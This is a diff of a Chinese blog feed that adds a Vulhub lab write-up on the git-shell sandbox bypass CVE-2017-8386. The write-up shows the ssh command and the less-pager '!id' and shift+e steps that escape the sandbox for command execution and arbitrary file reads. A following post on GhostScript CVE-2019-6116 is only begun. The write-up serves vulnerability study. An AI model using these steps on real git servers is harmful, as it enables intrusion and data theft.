+<p>当然，第二种方法内也可以用git-shell，比如在添加git用户的时候赋予其正常的<code>/bin/bash</code>，但在authorized_keys中设置<code>command=&quot;git-shell -c \&quot;$SSH_ORIGINAL_COMMAND\&quot;&quot;</code>，实际上还是使用了git-shell。</p>
+<h3 id="git-shell-沙盒绕过漏洞（CVE-2017-8386）"><a href="#git-shell-沙盒绕过漏洞（CVE-2017-8386）" class="headerlink" title="git-shell 沙盒绕过漏洞（CVE-2017-8386）"></a>git-shell 沙盒绕过漏洞（CVE-2017-8386）</h3><p>git-shell是一个可以限制用户执行命令的shell，如果我们在git用户家目录下创建一个新目录，叫<code>git-shell-commands</code>，然后将你允许用户执行的命令放在这个目录下，这就创建好了一个沙盒。在git-shell中，只能执行<code>/home/git/git-shell-commands</code>目录下的命令。</p>
+<p>如果系统是没有<code>git-shell-commands</code>目录，那么git-shell默认只允许执行如下三个命令：</p>
+<ul>
+<li><code>git-receive-pack &lt;argument&gt;</code></li>
+<li><code>git-upload-pack &lt;argument&gt;</code></li>
+<li><code>git-upload-archive &lt;argument&gt;</code></li>
+</ul>
+<p>这就是白名单。</p>
+<p>但CVE-2017-8386的作者发现，执行<code>git-upload-archive --help</code>（或<code>git-receive-pack --help</code>），将会进入一个交互式的man页面，man又调用了less命令，最后是一个可以上下翻页的帮助文档。</p>
+<p>本来这也没什么，但是，less命令有一个特性，就是其支持一些交互式的方法。比如在less页面中，按<code>shift</code>+e可以打开Examine功能，通过这个功能可以读取任意文件；输入<code>!id</code>就可以执行id这个命令。</p>
+<p>可以随便找台linux计算机试一下，执行<code>less /etc/passwd</code>来到less的页面，然后在英文输入法下输入<code>!id</code>，就可以执行id命令：</p>
+<p>所以，利用这个特性，我们就可以绕过git-shell的沙盒读取任意文件，或执行任意命令了！</p>
+<p>我们可以先试试，在Linux下直接执行<code>git-receive-pack --help</code>，再输入<code>!id</code>，看到的效果和上图是类似的。</p>
+<p><a href="https://evi1cg.me/archives/CVE-2017-8386.html" target="_blank" rel="noopener">evi1cg大佬的博客</a>中有动图，看的更直观。</p>
+<h3 id="通过ssh进行利用"><a href="#通过ssh进行利用" class="headerlink" title="通过ssh进行利用"></a>通过ssh进行利用</h3><p>那么，如何远程利用这个漏洞？</p>
+<p>我们前面试了，直接<code>ssh git@gitserver</code>只能拿到git-shell（或返回一段提醒文字），我们就利用上一节里提到的沙盒绕过漏洞执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 3322 -i id_rsa -t git@127.0.0.1 &quot;git-upload-archive &#39;--help&#39;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>进入帮助页面，然后按shift+e或<code>!id</code>即可。</p>
+<h3 id="一些限制"><a href="#一些限制" class="headerlink" title="一些限制"></a>一些限制</h3><p>我前文说了，一般配置git用户，不让ssh拥有shell，有两种方法：一是创建用户的时候设置其shell为<code>/usr/bin/git-shell</code>，二是在authorized_keys中覆盖command。</p>
+<p>如果目标服务器使用了第一种方法，我们即使成功执行了<code>git-upload-archive &#39;--help&#39;</code>进入帮助页面，也不能执行命令。因为<code>!id</code>还是在git-shell下执行，git-shell中没有id命令，所以依旧执行不成功。</p>
+<p>但读取文件是一定可以的，因为读取文件不是通过命令读取的，所以不受git-shell沙盒的影响。</p>
+<p>如果目标服务器是用第二种方法配置的git-shell，比如我这里这个测试环境，我是在<code>/etc/passwd</code>文件设置git用户的shell是bash，而在authorized_keys中覆盖command，执行git-shell。</p>
+<p>这种情况下，如果我进入了帮助页面，输入<code>!id</code>是可以成功执行id命令的，因为此时id是在bash下执行的，而不是在git-shell下执行的，所以没有沙盒限制。</p>
+<p>总的来说，这个漏洞至少能做到任意文件读取，有可能可以执行任意命令。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>GIT</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</title>
     <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6116%EF%BC%89/</url>
     <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p>
